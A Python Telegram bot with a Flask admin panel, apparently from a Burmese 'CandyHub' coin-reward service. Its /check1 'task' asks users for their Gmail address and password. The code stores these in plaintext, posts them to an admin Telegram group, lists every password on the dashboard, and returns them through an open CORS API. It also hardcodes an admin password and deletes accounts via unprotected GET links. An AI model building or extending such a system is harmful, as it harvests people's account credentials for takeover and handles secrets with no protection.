import telebot
from telebot import types
from flask import Flask, jsonify, render_template_string, request, redirect, url_for, session
from flask_cors import CORS
import threading
import os
from datetime import datetime

# -----------------[ Secret Variables များ ဖတ်ခြင်း ]-----------------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_GROUP_ID = int(os.environ.get("ADMIN_GROUP_ID", 0))

# Channel ID သို့မဟုတ် Username များ
CHANNEL_1_ID = "@CandyHub_Ch"       
CHANNEL_2_ID = "@candyhubassissiant" 

# Channel လင့်ခ်များ
CHANNEL_1_LINK = "https://t.me/CandyHub_Ch"
CHANNEL_2_LINK = "https://t.me/candyhubassissiant"

# Admin Web Dashboard သို့ ဝင်ရောက်ရန် လျှို့ဝှက်ချက်များ
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "CandyHubAdminPassword123!" 
# -----------------------------------------------------------

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask('')
app.secret_key = os.urandom(24)
CORS(app) # Netlify UI မှ API လှမ်းခေါ်ခွင့်ပြုရန်

# ဒေတာဘေ့စ် (ယာယီမှတ်ဉာဏ်ပေါ်တွင် သိမ်းဆည်းမည်)
users_db = {} 
user_states = {}

# --- 🌐 GORGEOUS PREMIUM ADMIN DASHBOARD TEMPLATE ---
ADMIN_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CandyHub - Admin Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: #0f172a;
            --card-dark: #1e293b;
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --text-main: #f8fafc;
            --text-sub: #94a3b8;
            --border: #334155;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .login-card {
            background: var(--card-dark);
            border: 1px solid var(--border);
            padding: 40px 30px;
            border-radius: 24px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        .logo-area {
            width: 70px;
            height: 70px;
            background: rgba(99, 102, 241, 0.15);
            color: var(--primary);
            border-radius: 20px;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            font-size: 32px;
            margin-bottom: 20px;
        }
        h2 { font-size: 24px; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.5px; }
        p.desc { color: var(--text-sub); font-size: 13px; margin-bottom: 30px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--text-sub); margin-bottom: 8px; letter-spacing: 0.5px;}
        .input-wrapper { position: relative; display: flex; align-items: center; }
        .input-wrapper i { position: absolute; left: 16px; color: var(--text-sub); font-size: 15px; }
        input {
            width: 100%;
            padding: 14px 16px 14px 48px;
            background: #111827;
            border: 1px solid var(--border);
            border-radius: 14px;
            color: var(--text-main);
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus { border-color: var(--primary); }
        .error-msg { color: #f87171; font-size: 13px; margin-bottom: 20px; font-weight: 600; }
        button {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.2);
            transition: background 0.2s;
        }
        button:hover { background: var(--primary-hover); }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo-area"><i class="fa-solid fa-screwdriver-wrench"></i></div>
        <h2>CandyHub Admin</h2>
        <p class="desc">စီမံခန့်ခွဲရေးဆာဗာသို့ လော့ဂ်အင်ဝင်ပါ</p>
        
        {% if msg %}<p class="error-msg"><i class="fa-solid fa-triangle-exclamation"></i> {{ msg }}</p>{% endif %}
        
        <form method="POST">
            <div class="input-group">
                <label>Admin Username</label>
                <div class="input-wrapper">
                    <i class="fa-regular fa-user"></i>
                    <input type="text" name="username" placeholder="Username ရိုက်ထည့်ပါ" required>
                </div>
            </div>
            <div class="input-group">
                <label>Password</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-lock"></i>
                    <input type="password" name="password" placeholder="Password ရိုက်ထည့်ပါ" required>
                </div>
            </div>
            <button type="submit">လော့ဂ်အင် ဝင်မည်</button>
        </form>
    </div>
</body>
</html>
"""

ADMIN_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CandyHub Control Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: #090d16;
            --card-dark: #111827;
            --primary: #6366f1;
            --success: #10b981;
            --danger: #ef4444;
            --text-main: #f8fafc;
            --text-sub: #94a3b8;
            --border: #1f2937;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            padding: 30px 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        /* Top Navigation Header */
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--card-dark);
            border: 1px solid var(--border);
            padding: 16px 24px;
            border-radius: 20px;
            margin-bottom: 30px;
        }
        .navbar-brand { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 20px; }
        .navbar-brand i { color: var(--primary); font-size: 24px; }
        .btn-logout {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.2);
            padding: 10px 18px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.2s;
        }
        .btn-logout:hover { background: var(--danger); color: white; }

        /* Stats Cards Section */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: var(--card-dark);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .stat-card-details h3 { font-size: 32px; font-weight: 800; margin-top: 5px; }
        .stat-card-details p { font-size: 12px; font-weight: 700; color: var(--text-sub); text-transform: uppercase; letter-spacing: 1px;}
        .stat-card-icon {
            width: 60px;
            height: 60px;
            border-radius: 18px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
        }

        /* Lists Section Layout */
        .content-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
        }
        @media (max-width: 900px) {
            .content-grid { grid-template-columns: 1fr; }
        }

        /* Card Panels */
        .panel {
            background: var(--card-dark);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 24px;
            margin-bottom: 30px;
        }
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1.5px solid var(--border);
        }
        .panel-title { font-size: 16px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
        .panel-title i { color: var(--primary); }

        /* Table Design */
        .table-responsive { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; text-align: left; }
        th, td { padding: 16px; border-bottom: 1.5px solid var(--border); font-size: 14px; }
        th { font-weight: 700; color: var(--text-sub); text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px;}
        td { color: var(--text-main); font-weight: 500; }
        tr:last-child td { border-bottom: none; }

        /* Active User Badge */
        .user-badge {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .user-avatar {
            width: 38px;
            height: 38px;
            border-radius: 12px;
            background: rgba(99, 102, 241, 0.15);
            color: var(--primary);
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: 800;
            font-size: 14px;
        }
        .active-dot {
            width: 8px;
            height: 8px;
            background-color: var(--success);
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 10px var(--success);
        }

        /* Form Inputs & Inline Edit Buttons */
        .coin-form { display: flex; align-items: center; gap: 8px; }
        .coin-input {
            width: 80px;
            padding: 8px 12px;
            background: #0f172a;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-main);
            font-size: 13px;
            font-weight: bold;
            outline: none;
        }
        .btn-update {
            background: rgba(99, 102, 241, 0.15);
            color: var(--primary);
            border: 1px solid rgba(99, 102, 241, 0.2);
            padding: 8px 12px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-update:hover { background: var(--primary); color: white; }

        .btn-delete {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.2);
            padding: 8px 12px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 12px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.2s;
        }
        .btn-delete:hover { background: var(--danger); color: white; }

        /* Active List Sidebar Group */
        .active-list { display: flex; flex-direction: column; gap: 12px; }
        .active-item {
            background: #1e293b;
            padding: 14px 16px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid var(--border);
        }
        .active-details h4 { font-size: 14px; font-weight: 700; color: var(--text-main); }
        .active-details p { font-size: 11px; color: var(--text-sub); margin-top: 2px; }

    </style>
</head>
<body>
    <div class="container">
        
        <!-- Navbar Header -->
        <div class="navbar">
            <div class="navbar-brand">
                <i class="fa-solid fa-chart-line"></i> CandyHub Control Panel
            </div>
            <a href="/logout" class="btn-logout"><i class="fa-solid fa-power-off"></i> Logout</a>
        </div>

        <!-- Dashboard Stat Cards -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-card-details">
                    <p>Total Registered Users</p>
                    <h3>{{ total_users }}</h3>
                </div>
                <div class="stat-card-icon" style="background: rgba(99, 102, 241, 0.15); color: var(--primary);">
                    <i class="fa-solid fa-users"></i>
                </div>
            </div>

            <div class="stat-card">
                <div class="stat-card-details">
                    <p>Active Users (Today)</p>
                    <h3>{{ active_users }}</h3>
                </div>
                <div class="stat-card-icon" style="background: rgba(16, 185, 129, 0.15); color: var(--success);">
                    <i class="fa-solid fa-circle-check"></i>
                </div>
            </div>
        </div>

        <div class="content-grid">
            <!-- Left Side: All Users Database Table -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title"><i class="fa-solid fa-database"></i> အသုံးပြုသူများအားလုံး စီမံခန့်ခွဲရေးဇယား</div>
                </div>
                <div class="table-responsive">
                    <table>
                        <thead>
                            <tr>
                                <th>User ID</th>
                                <th>Name / Username</th>
                                <th>Gmail</th>
                                <th>Password</th>
                                <th>Coins (ပြင်ရန်)</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for uid, user in users.items() %}
                            <tr>
                                <td><code>{{ uid }}</code></td>
                                <td>
                                    <div class="user-badge">
                                        <div class="user-avatar">{{ user.name[0].upper() }}</div>
                                        <div>
                                            <div style="font-weight: 700;">{{ user.name }}</div>
                                            <div style="font-size: 11px; color: var(--text-sub);">User</div>
                                        </div>
                                    </div>
                                </td>
                                <td>{{ user.email }}</td>
                                <td><code>{{ user.password }}</code></td>
                                <td>
                                    <form method="POST" action="/update_coin/{{ uid }}" class="coin-form">
                                        <input type="number" name="coin" value="{{ user.coin }}" class="coin-input">
                                        <button type="submit" class="btn-update">Update</button>
                                    </form>
                                </td>
                                <td>
                                    <a href="/delete_user/{{ uid }}" class="btn-delete" onclick="return confirm('ဤအသုံးပြုသူအကောင့်အား ဖျက်ပစ်ရန် သေချာပါသလား?')">Delete</a>
                                </td>
                            </tr>
                            {% else %}
                            <tr>
                                <td colspan="6" style="text-align: center; color: var(--text-sub); padding: 40px 0;">လတ်တလော စာရင်းသွင်းထားသူများ မရှိသေးပါ (Bot ထဲတွင် /start နှိပ်ရန်လိုအပ်သည်)</td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Right Side: Active Users Sidebar -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title"><i class="fa-solid fa-bullseye"></i> Active Users (ယနေ့)</div>
                </div>
                <div class="active-list">
                    {% for act in active_list %}
                    <div class="active-item">
                        <div class="active-details">
                            <h4>{{ act.name }}</h4>
                            <p>Email: {{ act.email }}</p>
                        </div>
                        <span class="active-dot"></span>
                    </div>
                    {% else %}
                    <div style="text-align: center; color: var(--text-sub); padding: 20px 0; font-size: 13px;">ယနေ့အတွင်း လှုပ်ရှားသူ မရှိသေးပါ</div>
                    {% endfor %}
                </div>
            </div>
        </div>

    </div>
</body>
</html>
"""

# --- 🌐 WEB CONTROLLERS / API & ROUTING ---

@app.route('/', methods=['GET', 'POST'])
def admin_login():
    msg = ""
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password'].strip()
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            msg = "Admin Username သို့မဟုတ် Password မှားယွင်းနေပါသည်။"
    return render_template_string(ADMIN_LOGIN_TEMPLATE, msg=msg)

@app.route('/admin-panel')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    total_users = len(users_db)
    active_list = []
    current_date = datetime.now().strftime("%Y-%m-%d")
    for uid, data in users_db.items():
        if data.get('last_active') == current_date:
            active_list.append(data)
    active_users = len(active_list)
    return render_template_string(ADMIN_DASHBOARD_TEMPLATE, users=users_db, total_users=total_users, active_users=active_users, active_list=active_list)

@app.route('/update_coin/<int:user_id>', methods=['POST'])
def update_coin(user_id):
    if session.get('admin') and user_id in users_db:
        users_db[user_id]['coin'] = int(request.form['coin'])
    return redirect(url_for('admin_dashboard'))

@app.route('/delete_user/<int:user_id>')
def delete_user(user_id):
    if session.get('admin') and user_id in users_db:
        del users_db[user_id]
    return redirect(url_for('admin_dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('admin_login'))

# CORS အထောက်အပံ့ဖြင့် Netlify Frontend မှ ခေါ်ယူရန် လော့ဂ်အင် API
@app.route('/api/user/login', methods=['POST'])
def user_login_api():
    data = request.json or {}
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    for uid, udata in users_db.items():
        if udata.get('email') == email and udata.get('password') == password:
            return jsonify({
                "status": "success",
                "user_id": uid,
                "name": udata['name'],
                "email": udata['email'],
                "password": udata['password'],
                "coin": udata['coin']
            })
    return jsonify({"status": "failed", "message": "အီးမေးလ် သို့မဟုတ် စကားဝှက် မှားယွင်းနေပါသည်!"}), 401


def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)


# --- 🤖 TELEGRAM BOT CORE SYSTEM ---

def update_active_status(user_id):
    if user_id in users_db:
        users_db[user_id]['last_active'] = datetime.now().strftime("%Y-%m-%d")

def check_channel_joined(user_id):
    try:
        member1 = bot.get_chat_member(CHANNEL_1_ID, user_id)
        member2 = bot.get_chat_member(CHANNEL_2_ID, user_id)
        return member1.status in ['member', 'administrator', 'creator'] and member2.status in ['member', 'administrator', 'creator']
    except:
        return False

# 1. /start Command (ကြိုဆိုခြင်း၊ Channel Join စစ်ဆေးခြင်း)
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("ခလုတ် 1 (CandyHub_Ch)", url=CHANNEL_1_LINK))
    markup.add(types.InlineKeyboardButton("ခလုတ် 2 (candyhubassissiant)", url=CHANNEL_2_LINK))
    markup.add(types.InlineKeyboardButton("🔄 Check Button (စစ်ဆေးမည်)", callback_data="check_join"))
    
    bot.send_message(message.chat.id, "မင်္ဂလာပါရှင့်။\nBot ကိုအသုံးပြုရန် အောက်က channel လေးတွေ join ပေးပါနော်\n(Join မှ bot သုံးရမှာဖြစ်ပါတယ်)", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    user_id = call.from_user.id
    if check_channel_joined(user_id):
        bot.answer_callback_query(call.id, "အတည်ပြုချက် အောင်မြင်ပါသည်!")
        
        # database ထဲအလိုအလျောက် default တန်ဖိုးဖြင့်ထည့်သွင်းခြင်း
        if user_id not in users_db:
            users_db[user_id] = {
                'name': call.from_user.first_name,
                'email': 'မထည့်ရသေးပါ',
                'password': 'မထည့်ရသေးပါ',
                'coin': 0,
                'last_active': datetime.now().strftime("%Y-%m-%d")
            }
        
        bot.send_message(call.message.chat.id, "✅ အတည်ပြုကြောင်းစာ- Channel Join တာ အောင်မြင်ပါပြီရှင့်။\n\n/profile - အကောင့်အချက်အလက်ကြည့်ရန်\n/check1 - CandyHub Task စစ်ဆေးရန်\n/checkads - Ads Task စစ်ဆေးရန်")
    else:
        bot.answer_callback_query(call.id, "❌ Channel များအားလုံးကို မဝင်ရသေးပါ!", show_alert=True)

# 2. /profile Command
@bot.message_handler(commands=['profile'])
def show_profile(message):
    user_id = message.from_user.id
    update_active_status(user_id)
    
    if user_id not in users_db:
        bot.reply_to(message, "⚠️ ကျေးဇူးပြု၍ /start ကို အရင်နှိပ်ပြီး Channel Join စစ်ဆေးပါ။")
        return
        
    u = users_db[user_id]
    profile_text = (
        "👤 **လူကြီးမင်း၏ Profile အချက်အလက်များ**\n\n"
        f"📝 TG Name: {u['name']}\n"
        f"🆔 User ID: `{user_id}`\n"
        f"📧 Gmail: {u['email']}\n"
        f"🔑 Password: `{u['password']}`\n"
        f"💰 လက်ကျန် Coin: {u['coin']} Coins"
    )
    bot.send_message(message.chat.id, profile_text, parse_mode="Markdown")

# 3. /check1 Command (CandyHub Task)
@bot.message_handler(commands=['check1'])
def start_check1(message):
    user_id = message.from_user.id
    update_active_status(user_id)
    
    if not check_channel_joined(user_id):
        bot.reply_to(message, "⚠️ Channel အရင် Join ရပါမည်။")
        return
        
    bot.reply_to(message, "📧 [Task 1] ကျေးဇူးပြု၍ လူကြီးမင်း၏ Email နှင့် Password ကို (ဥပမာ- example@gmail.com / pass123) ပုံစံဖြင့် ရိုက်ထည့်ပေးပါ။")
    user_states[user_id] = {'step': 'WAITING_TASK_INFO', 'type': 'check1'}

# 4. /checkads Command (Ads Task)
@bot.message_handler(commands=['checkads'])
def start_checkads(message):
    user_id = message.from_user.id
    update_active_status(user_id)
    
    if not check_channel_joined(user_id):
        bot.reply_to(message, "⚠️ Channel အရင် Join ရပါမည်။")
        return
        
    bot.reply_to(message, "📸 [Ads Task] ကျေးဇူးပြု၍ Ads ကြည့်ရှုထားသည့် သက်သေခံဓာတ်ပုံ (Photo) ကို ပို့ပေးပါရန်။")
    user_states[user_id] = {'step': 'WAITING_ADS_PHOTO', 'type': 'checkads'}

# စာသားလက်ခံခြင်း (Email/Password ရိုက်ချက်)
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'WAITING_TASK_INFO')
def get_task_info(message):
    user_id = message.from_user.id
    text = message.text
    
    if "/" in text:
        parts = text.split("/")
        users_db[user_id]['email'] = parts[0].strip()
        users_db[user_id]['password'] = parts[1].strip()
    else:
        users_db[user_id]['email'] = text.strip()
        users_db[user_id]['password'] = "မသတ်မှတ်ရသေး"

    user_states[user_id]['step'] = 'WAITING_TASK_PHOTO'
    bot.reply_to(message, "📸 ကျေးဇူးပြု၍ သက်သေခံ ဓာတ်ပုံ (Photo) ကို ပို့ပေးပါရန်။")

# ဓာတ်ပုံလက်ခံခြင်း
@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    user_id = message.from_user.id
    state = user_states.get(user_id, {})
    
    if state.get('step') == 'WAITING_TASK_PHOTO' and state.get('type') == 'check1':
        photo_id = message.photo[-1].file_id
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"c1_confirm_{user_id}"),
                   types.InlineKeyboardButton("❌ Reject", callback_data=f"c1_reject_{user_id}"))
        
        msg_text = f"📩 **[Task 1] စစ်ဆေးရန် တောင်းဆိုချက်**\n\n👤 Name: {users_db[user_id]['name']}\n🆔 ID: `{user_id}`\n📧 Gmail: {users_db[user_id]['email']}\n🔑 Pass: `{users_db[user_id]['password']}`\n⏰ အချိန်: {time_str}"
        bot.send_photo(ADMIN_GROUP_ID, photo_id, caption=msg_text, reply_markup=markup, parse_mode="Markdown")
        bot.reply_to(message, "⏳ အချက်အလက်များကို Admin Group သို့ တင်ပြထားပါသည်။")
        user_states[user_id] = {}
        
    elif state.get('step') == 'WAITING_ADS_PHOTO' and state.get('type') == 'checkads':
        photo_id = message.photo[-1].file_id
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"ads_confirm_{user_id}"),
                   types.InlineKeyboardButton("❌ Reject", callback_data=f"ads_reject_{user_id}"))
        
        msg_text = f"📺 **[Ads Task] စစ်ဆေးရန် တောင်းဆိုချက်**\n\n👤 Name: {users_db[user_id]['name']}\n🆔 User ID: `{user_id}`"
        bot.send_photo(ADMIN_GROUP_ID, photo_id, caption=msg_text, reply_markup=markup, parse_mode="Markdown")
        bot.reply_to(message, "⏳ Ads အချက်အလက်များကို Admin သို့ တင်ပြထားပါသည်။")
        user_states[user_id] = {}
# Admin ခလုတ်များ ကိုင်တွယ်ခြင်း
@bot.callback_query_handler(func=lambda call: call.data.startswith(("c1_", "ads_")))
def admin_actions(call):
    data = call.data.split("_")
    task_type = data[0] 
    action = data[1]    
    target_uid = int(data[2])
    
    if action == "confirm":
        if target_uid in users_db:
            users_db[target_uid]['coin'] += 10 # Coin ပေါင်းထည့်ပေးခြင်း
            
        bot.edit_message_caption(f"✅ အတည်ပြုပြီးပါပြီ (User ID: {target_uid})", chat_id=call.message.chat.id, message_id=call.message.message_id)
        
        if task_type == "c1":
            bot.send_message(target_uid, "🎉 candyhubမှ task ကိုစစ်ဆေးပြီးပါပြီ။")
        else:
            bot.send_message(target_uid, "🎉 candy(ads) မှ စစ်ဆေးပြီးပါပီ့။")
            
    elif action == "reject":
        bot.edit_message_caption(f"❌ ငြင်းပယ်လိုက်ပါပြီ (User ID: {target_uid})", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.send_message(target_uid, "❌ စိတ်မကောင်းပါဘူးရှင့်၊ လူကြီးမင်းပေးပို့သော သက်သေခံချက် မပြည့်စုံသဖြင့် ငြင်းပယ်ခံရပါသည်။")

if __name__ == "__main__":
    t = threading.Thread(target=run_flask)
    t.start()
    print("CandyHub System is Live...")
    bot.infinity_polling()
